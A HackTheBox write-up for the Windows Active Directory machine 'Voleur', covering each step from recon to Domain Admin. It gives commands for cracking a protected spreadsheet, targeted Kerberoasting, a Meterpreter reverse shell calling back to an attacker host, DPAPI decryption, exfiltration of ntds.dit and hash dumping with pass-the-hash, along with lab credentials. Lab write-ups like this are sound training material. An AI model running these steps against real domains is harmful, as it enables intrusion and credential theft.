---
title: "HTB - Voleur (Medium | Windows | Active Directory)"
date: 2026-09-16 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, bloodhound, netexec, smbclient, kerberos, office2john, john, dpapi, wsl, secretsdump, kerberoasting, kinit, evil-winrm, targeted-kerberoasting, runascs, msfvenom, meterpreter, scp, ad-recycle-bin, ntds-dit]
description: "Crack a protected Excel for creds, then targeted Kerberoasting, DPAPI & AD Recycle Bin abuse to NTDS.dit for Domain Admin"
image:
  path: /assets/img/voleur.png
---

## **Recon**

```bash
nmap -p- -sC -sV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-16 06:04:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
60984/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60985/tcp open  msrpc         Microsoft Windows RPC
60986/tcp open  msrpc         Microsoft Windows RPC
61010/tcp open  msrpc         Microsoft Windows RPC
64356/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-16T06:05:23
|_  start_date: N/A
```

### Service Discovery Analysis

The Nmap scan reveals multiple critical services running on the target machine:

- **DNS (Port 53):** Simple DNS Plus
- **Kerberos (Port 88):** Microsoft Windows Kerberos
- **SMB (Port 139, 445):** Microsoft Windows file sharing with message signing required
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services
- **RPC (Port 135, 593, 60984):** Various RPC endpoints
- **SSH (Port 2222):** OpenSSH 8.2p1 on Ubuntu Linux
- **WinRM (Port 5985):** Windows Remote Management
- **RPC Services (Ports 49664, 49668, 60985-61010, 64356):** Multiple RPC endpoints

The domain is identified as voleur.htb with hostname DC. The presence of both Windows and Linux services suggests a mixed environment.

### BloodHound Data Collection

Collect Active Directory information using BloodHound Python with Kerberos authentication:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodhound-python -d voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -c All -ns <target> --zip
```

This provides a comprehensive view of the domain structure, user relationships, and potential privilege escalation paths.

### Kerberos Configuration

Generate krb5.conf file for Kerberos-based authentication:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k --generate-krb5-file voleur.krb5
```

Create the krb5.conf file:

```bash
echo '[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VOLEUR.HTB

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB' | sudo tee /etc/krb5.conf 
```

### SMB Enumeration

Enumerate available SMB shares using netexec with Kerberos authentication:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb <target> -u ryan.naylor -p 'HollowOct31Nyt' -k -d voleur.htb --shares
```

![](/assets/img/voleur/Pasted_image_20260915192932.png)

### Share Content Discovery

Spider the IT share to identify interesting files:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb <target> -u ryan.naylor -p 'HollowOct31Nyt' -k -d voleur.htb --spider IT --pattern ''
```

![](/assets/img/voleur/Pasted_image_20260915193002.png)

An interesting Excel file (Access_Review.xlsx) is discovered and will be downloaded for analysis.

### Download Protected Excel File

Download the Access_Review.xlsx file:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -d VOLEUR.HTB --share IT --get-file "First-Line Support\Access_Review.xlsx" Access_Review.xlsx
```

### Crack Excel Password

Convert the Excel file to a crackable hash:

```bash
office2john Access_Review.xlsx > excel.hash
john excel.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/voleur/Pasted_image_20260915193525.png)

**Result:** The Excel password is cracked to **football1**

### Open Protected Excel File

Install and use LibreOffice Calc to open the protected file:

```bash
## Installation
sudo apt update && sudo apt install libreoffice-calc -y

localc Access_Review.xlsx &
```

![](/assets/img/voleur/Pasted_image_20260915194100.png)

Multiple credentials are discovered within the spreadsheet:

![](/assets/img/voleur/Pasted_image_20260915195430.png)

---

## **User**

### Targeted Kerberoasting Attack

BloodHound analysis reveals that the user SVC_LDAP has WriteSPN rights over the SVC_WINRM user. This enables a targeted Kerberoasting attack.

#### Step 1: Request TGT for svc_ldap

Request a Ticket Granting Ticket for the svc_ldap user using credentials discovered in the Excel file:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT voleur.htb/svc_ldap -dc-ip <target>

Password:
[*] Saving ticket in svc_ldap.ccache
```

#### Step 2: Verify Kerberos Ticket

Export and verify the Kerberos ticket cache:

```bash
export KRB5CCNAME=svc_ldap.ccache
klist
```

![](/assets/img/voleur/Pasted_image_20260915200715.png)

#### Step 3: Perform Targeted Kerberoasting

Execute targeted Kerberoasting against SVC_WINRM using WriteSPN privilege:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
python targetedKerberoast.py -d voleur.htb --dc-host DC.voleur.htb -u svc_ldap@voleur.htb -k
```

![](/assets/img/voleur/Pasted_image_20260915201155.png)

#### Step 4: Crack Kerberos Hash

Use John the Ripper to crack the extracted Kerberos hash:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

AFireInsidedeOzarctica980219afi 
```

![](/assets/img/voleur/Pasted_image_20260915201314.png)

**svc_winrm password:** `AFireInsidedeOzarctica980219afi`

#### Step 5: Request TGT for svc_winrm

Request a TGT for the newly cracked svc_winrm account:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT voleur.htb/svc_winrm -dc-ip <target>

[*] Saving ticket in svc_winrm.ccache

export KRB5CCNAME=svc_winrm.ccache
```

#### Step 6: Establish WinRM Session

Connect to the target using evil-winrm with Kerberos authentication:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
evil-winrm -i DC.voleur.htb -r voleur.htb
```

#### Step 7: Retrieve User Flag

Capture the user.txt flag:

![](/assets/img/voleur/Pasted_image_20260915201723.png)

---

## **Root**

### Lateral Movement via Credential Restoration

BloodHound analysis shows that svc_ldap is a member of the RESTORE_USERS group:

![](/assets/img/voleur/Pasted_image_20260916065507.png)

Since svc_ldap is not a member of Remote Management Users, lateral movement from the svc_winrm session is required.

#### Step 1: Upload Exploitation Tools

Upload Invoke-RunasCs and msfvenom-generated reverse shell to svc_winrm session:

```powershell
*Evil-WinRM* PS C:\Programdata> upload Invoke-RunasCs.ps1
Import-Module .\Invoke-RunasCs.ps1
```

Generate Meterpreter payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=5555 -f exe -o shell.exe
```

Upload shell.exe:

```powershell
*Evil-WinRM* PS C:\Programdata> upload shell.exe
```

#### Step 2: Set Up Metasploit Handler

Configure Metasploit to receive the reverse connection:

```bash
msfconsole -q
set payload windows/x64/meterpreter/reverse_tcp
set lhost <attacker_ip>
set lport 5555
run
```

#### Step 3: Execute as svc_ldap

Use RunasCs to execute the reverse shell with svc_ldap credentials from the Excel file:

```powershell
Invoke-RunasCs -Username 'svc_ldap' -Password 'M1XyC9pW7qT5Vn' -Command 'C:\Programdata\shell.exe' -ProcessTimeout 0
```

![](/assets/img/voleur/Pasted_image_20260916073130.png)

A Meterpreter session is established as svc_ldap user.

#### Step 4: Enumerate Deleted Active Directory Objects

List deleted objects in Active Directory:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

![](/assets/img/voleur/Pasted_image_20260916073625.png)

The deleted user **Todd Wolfe** (referenced in the Excel spreadsheet) is discovered with password `NightT1meP1dg3on14`.

#### Step 5: Restore Deleted User

Restore and enable the Todd Wolfe account:

```powershell
Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
Enable-ADAccount -Identity "Todd.Wolfe"
```

#### Step 6: Verify Restored User

Verify that Todd Wolfe can authenticate:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb <target> -u Todd.Wolfe -p 'NightT1meP1dg3on14' -k -d voleur.htb --shares
```

![](/assets/img/voleur/Pasted_image_20260916074312.png)

#### Step 7: Spider IT Share as Todd Wolfe

Explore the IT share using Todd Wolfe's credentials:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb <target> -u Todd.Wolfe -p 'NightT1meP1dg3on14' -k -d voleur.htb --spider IT --pattern ''
```

![](/assets/img/voleur/Pasted_image_20260916075552.png)

#### Step 8: DPAPI Decryption

Request TGT for Todd Wolfe:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT voleur.htb/todd.wolfe -dc-ip <target>

[*] Saving ticket in Todd.Wolfe.ccache
```

Connect via SMB to retrieve DPAPI files:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-smbclient -k -no-pass VOLEUR.HTB/todd.wolfe@dc.voleur.htb

use IT
```

Download DPAPI credential and masterkey files:

```bash
cd "Second-Line Support/Archived Users/todd.wolfe/Appdata/Roaming/Microsoft/Credentials/"
get 772275FAD58525253490A9B0039791D3

cd "Second-Line Support/Archived Users/todd.wolfe/Appdata/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110"
get 08949382-134f-4c63-b93c-ce52efc0aa88
```

#### Step 9: Decrypt Master Key

Decrypt the DPAPI master key using Todd Wolfe's password:

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

#### Step 10: Decrypt DPAPI Credential

Decrypt the credential file using the master key:

```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

![](/assets/img/voleur/Pasted_image_20260916081356.png)

**New credentials obtained:** jeremy.combs:qT3V9pLXyN7W4m

#### Step 11: Request TGT for jeremy.combs

Request a TGT for the newly discovered jeremy.combs account:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT voleur.htb/jeremy.combs -dc-ip <target>

[*] Saving ticket in jeremy.combs.ccache

export KRB5CCNAME=jeremy.combs.ccache
```

#### Step 12: Enumerate with jeremy.combs

Spider the IT share as jeremy.combs:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb <target> -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k -d voleur.htb --spider IT --pattern ''
```

![](/assets/img/voleur/Pasted_image_20260916090619.png)

Two critical files are discovered: id_rsa and note.txt

#### Step 13: Download Files

Download both files:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb <target> -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k -d voleur.htb --share IT --get-file "Third-Line Support/Note.txt.txt" note.txt

faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
nxc smb <target> -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k -d voleur.htb --share IT --get-file "Third-Line Support/id_rsa" id_rsa
```

The note indicates that id_rsa belongs to svc_backup user.

![](/assets/img/voleur/Pasted_image_20260916090808.png)

#### Step 14: SSH Access as svc_backup

Connect via SSH on port 2222 using the discovered SSH key:

```bash
chmod 600 id_rsa
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```

![](/assets/img/voleur/Pasted_image_20260916091333.png)

#### Step 15: Check Sudo Privileges

Verify sudo privileges for svc_backup:

```bash
sudo -l
```

![](/assets/img/voleur/Pasted_image_20260916092826.png)

svc_backup can execute commands as root without a password.

#### Step 16: Locate Backup Files

Discover mounted Windows drive and backup location:

![](/assets/img/voleur/Pasted_image_20260916092137.png)

Navigate to the Backups directory:

![](/assets/img/voleur/Pasted_image_20260916093901.png)

![](/assets/img/voleur/Pasted_image_20260916094212.png)

#### Step 17: Download Backup Files

Retrieve the NTDS database and registry hives:

```bash
scp -i id_rsa -P 2222 "svc_backup@<target>:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" ./ntds.dit

scp -i id_rsa -P 2222 "svc_backup@<target>:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" ./SYSTEM

scp -i id_rsa -P 2222 "svc_backup@<target>:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" ./SECURITY
```

#### Step 18: Extract Administrator Hash

Use impacket-secretsdump to extract all domain hashes:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

![](/assets/img/voleur/Pasted_image_20260916094716.png)

**Administrator NT Hash:** `e656e07c56d831611b577b160b259ad2`

#### Step 19: Request Administrator TGT

Request a TGT for the Administrator account using the extracted hash:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2

[*] Saving ticket in administrator.ccache

export KRB5CCNAME=administrator.ccache
```

#### Step 20: Establish Administrator WinRM Session

Connect as Administrator using Kerberos:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
evil-winrm -i DC.voleur.htb -r voleur.htb
```

#### Step 21: Retrieve Root Flag

Capture the root.txt flag:

![](/assets/img/voleur/Pasted_image_20260916094947.png)

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified mixed Windows/Linux environment with Active Directory and SSH services
2. **BloodHound Collection:** Gathered AD structure and identified WriteSPN privileges
3. **Excel Exploitation:** Downloaded, cracked, and extracted credentials from protected Excel file
4. **Share Enumeration:** Discovered Access_Review.xlsx containing multiple user credentials
5. **Targeted Kerberoasting:** Used svc_ldap's WriteSPN privilege to Kerberoast svc_winrm
6. **Initial Access:** Obtained svc_winrm credentials and established WinRM session
7. **Lateral Movement:** Used RunasCs to escalate to svc_ldap with Meterpreter
8. **User Restoration:** Enumerated and restored deleted Todd Wolfe account from Active Directory Recycle Bin
9. **DPAPI Decryption:** Extracted and decrypted credentials for jeremy.combs using master key
10. **SSH Access:** Downloaded id_rsa and established SSH connection as svc_backup
11. **Backup Exfiltration:** Located and downloaded NTDS.dit and registry hives from backup location
12. **Hash Extraction:** Used secretsdump to extract all domain hashes including Administrator
13. **Administrator Access:** Requested Administrator TGT and established final WinRM session
14. **Full Compromise:** Achieved Administrator access and retrieved root flag